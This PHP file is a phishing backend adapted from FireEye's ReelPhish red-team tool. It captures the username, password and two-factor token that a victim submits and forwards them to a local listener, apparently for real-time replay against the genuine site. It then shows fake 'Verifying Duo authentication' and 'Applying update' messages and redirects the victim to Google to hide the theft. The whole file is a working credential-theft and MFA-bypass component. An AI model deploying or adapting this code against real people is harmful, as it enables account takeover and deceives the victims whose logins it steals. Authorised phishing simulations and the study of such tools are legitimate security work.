<?php
/*
Taken and modified from ReelPhish https://github.com/fireeye/ReelPhish
Original Authors: Pan Chan, Trevor Haskell (FireEye)
*/
    if(isset($_POST['username']) && isset($_POST['password']) && isset($_POST['secondPassword'])) {
          $all_data = http_build_query(
              array(
                  'username' => $_POST['username'],
                  'password' => $_POST['password'],
                  'token' => $_POST['secondPassword']
                )
          );
          $http_query = array(
              'http' => array(
                  'method' => 'POST',
                  'header' => 'Content-type: application/x-www-form-urlencoded',
                  'timeout' => 3,
                  'content' => $all_data
              )
          );
          $local_url = "http://127.0.0.1:3000";
          $context = stream_context_create($http_query);
          $rtnval = file_get_contents($local_url, false, $context);
?>
<html>
<head>
<style>
.outer {
  display: table;
  position: absolute;
  height: 100%;
  width: 100%;
}

.middle {
  display: table-cell;
  vertical-align: middle;
}

.inner {
  margin-left: auto;
  margin-right: auto;
  width: 400px;
}
p {
 text-align: center;
line-height: 100px;

}

</style>
</head>
<body>
<div class="outer">
  <div class="middle">
    <div class="inner">
      <div id="main">
        <p>
          <div id="userMsg">
            <em>Verifying Duo authentication...</em>
          </div>
        </p>
      </div>
    </div>
  </div>
</div>
      <script type="text/javascript">
          setTimeout(function () {
             document.getElementById("userMsg").innerHTML = "<em>Applying update, please do not close this window…</em>";
          }, 20000);
          setTimeout(function () {
             window.location = "https://www.google.com";
          }, 30000);
      </script>
</body>
</html>
    <?php
      }
?>
